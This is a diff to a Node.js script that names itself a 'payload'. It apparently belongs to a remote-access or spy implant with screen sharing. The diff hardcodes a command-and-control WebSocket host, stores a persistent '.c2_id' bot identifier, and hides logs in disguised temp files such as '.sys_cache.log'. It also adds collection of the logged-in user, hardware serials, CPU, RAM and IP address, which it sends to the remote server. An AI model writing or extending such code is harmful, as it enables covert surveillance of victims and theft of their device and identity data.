@@ -5,59 +5,28 @@ const os = require('os');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
+const { spawn } = require('child_process');
 
 // --- CONFIGURATION ---
-// Define WS_URL here to fix the ReferenceError
-const WS_URL = process.env.WS_URL || 'wss://your-server-url.com'; 
-
-// --- FORCE INSTALLATION CHECK ---
-try {
-    const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
-    if (!fs.existsSync(nodeModulesPath)) {
-        console.log("[FORCE] @roamhq/wrtc missing. Installing...");
-        execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
-        console.log("[FORCE] Installation complete.");
-    }
-} catch (e) {
-    console.warn("[FORCE] Could not auto-install:", e.message);
-}
-
-// --- NATIVE WEBRTC IMPORTS ---
-let wrtc;
-try {
-    // Attempt to load the native module
-    wrtc = require('@roamhq/wrtc');
-} catch (e) {
-    console.error("Failed to require @roamhq/wrtc:", e.message);
-}
-
-// Check if the module actually has the required exports
-const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
-
-if (!HAS_WEBRTC) {
-    console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
-    console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
-}
-
-const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
-
-// --- LOGGING SYSTEM ---
+const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
+const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
+const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log');
+
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
 function log(msg) {
  const timestamp = new Date().toISOString();
- console.log(`[${timestamp}] ${msg}`);
- try {
- fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
- if (ws && ws.readyState === WebSocket.OPEN && myId) {
- safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
- }
- } catch (e) {}
+ const logLine = `[${timestamp}] ${msg}`;
+ console.log(logLine);
+ try { 
+ fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
+ fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
+ } catch(e) {}
 }
 
-log("[INIT] Payload starting...");
+log("[INIT] Payload starting silently...");
 
 // --- HARDWARE FINGERPRINT ---
 function getHardwareFingerprint() {
@@ -81,35 +50,32 @@ function getMacAddress() {
 
 function getCpuSerial() {
  try { 
- // Try Windows first
+ // Windows
  return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); 
  } catch (e) {
  try { 
- // Fallback to Linux
+ // Linux
  return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim(); 
  } catch (e2) { 
- // Final fallback to Node.js OS info
- return os.cpus()[0].model || 'unknown_cpu'; 
+ return 'unknown_cpu'; 
  } }
 }
 
 function getBoardSerial() {
  try { 
- // Try Windows first
+ // Windows
  return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); 
  } catch (e) {
  try { 
- // Fallback to Linux
+ // Linux
  return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim(); 
  } catch (e2) { 
- // Final fallback to Node.js OS info
- return os.hostname() || 'unknown_board'; 
+ return 'unknown_board'; 
  } }
 }
 
 // --- ID MANAGEMENT ---
 let myId = null;
-const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 try {
  if (fs.existsSync(PERSIST_FILE)) {
  const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
@@ -160,7 +126,6 @@ function initConnection() {
  stdio: ['ignore', 'pipe', 'ignore']
  };
 
-
  // Detect operating system and hardware
  if (process.platform === 'win32') {
 
@@ -208,6 +173,22 @@ function initConnection() {
  ).trim();
  } catch (e) {}
 
+ // Get logged-in Windows desktop user (REAL USER NAME)
+ try {
+ realUser = execSync(
+ 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).UserName"',
+ commandOptions
+ ).trim();
+ } catch (e) {}
+
+ if (!realUser) {
+ try {
+ realUser = execSync('whoami', commandOptions).trim();
+ } catch (e) {
+ realUser = os.userInfo().username || 'user';
+ }
+ }
+
  } else if (process.platform === 'darwin') {
 
  // macOS OS details
@@ -241,6 +222,12 @@ function initConnection() {
  realCpu = execSync('sysctl -n machdep.cpu.brand_string', commandOptions).trim();
  } catch (e) {
  realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
+ }
+
+ try {
+ realUser = execSync('whoami', commandOptions).trim();
+ } catch (e) {
+ realUser = os.userInfo().username || 'user';
  }
 
  } else if (process.platform === 'linux') {
@@ -284,29 +271,22 @@ function initConnection() {
  // Linux CPU model
  realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
 
+ try {
+ realUser = execSync('whoami', commandOptions).trim();
+ } catch (e) {
+ realUser = os.userInfo().username || 'user';
+ }
+
  } else {
 
  realOsName = process.platform + ' ' + os.release();
  realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
- }
 
- // Get the actual guest username using your working method
  try {
  realUser = os.userInfo().username || 'user';
  } catch (e) {
  realUser = 'user';
  }
-
- // Get the actual guest computer name
- const finalDeviceName = os.hostname() || 'Unknown';
-
- // Get the actual guest public IP using your working method
- let realIp = '';
-
- try {
- realIp = getExternalIP() || '';
- } catch (e) {
- realIp = myIp || '';
  }
 
  // Final hardware and system information
@@ -317,19 +297,28 @@ function initConnection() {
  const realCpuCores = os.cpus().length;
 
  // Send actual guest device information
- // FIXED: Ensure all keys match the server.js expectations exactly
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
- fingerprint: myId,
+ uniqueId: myId,
+
+ deviceName: realDeviceName,
  os: realOsName,
+ platform: process.platform,
+ osVersion: os.release(),
  arch: os.arch(),
  user: realUser,
- ip: realIp,
- last_seen: Math.floor(Date.now() / 1000),
- status: 'Online',
- created_at: Math.floor(Date.now() / 1000),
- serial_number: realSerialNumber || realModel || 'Unknown'
+
+ manufacturer: realManufacturer || 'Unavailable',
+ model: realModel || 'Unavailable',
+ serialNumber: realSerialNumber || null,
+
+ cpu: realCpu || 'Unavailable',
+ cpuCores: realCpuCores,
+ ramGB: realRamGB,
+
+ ip: myIp,
+ fingerprint: myId
  }));
 
  startMonitoring();
@@ -420,7 +409,7 @@ function handleCandidate(candidate) {
 }
 
 // --- HTTP PORT LISTENER (For Render Health) ---
-const PORT = Number(process.env.PORT) || 10000;
+const PORT = Number(process.env.PORT) || 3000;
 const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
